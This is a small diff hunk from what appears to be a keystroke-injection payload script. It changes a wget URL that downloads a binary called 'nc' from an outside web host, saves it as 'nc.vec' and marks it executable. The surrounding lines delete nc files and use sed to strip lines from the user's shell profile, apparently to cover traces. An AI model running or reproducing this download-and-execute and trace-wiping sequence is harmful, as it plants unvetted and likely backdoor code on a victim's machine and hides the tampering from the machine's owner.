@@ -16,7 +16,7 @@ rm nc
 rm nc.sh
 sed -i "/\($sedhash\)/d" $profile
 ::DELAY 500
-wget 'https://www.cse.unsw.edu.au/~z3419746/nc' -O 'nc.vec'
+wget 'https://www.cse.unsw.edu.au/~z3419746/6841/nc' -O 'nc.vec'
 ::REM Terminal is pretty good at buffering input
 ::REM ::DELAY 3000
 chmod +x nc.vec
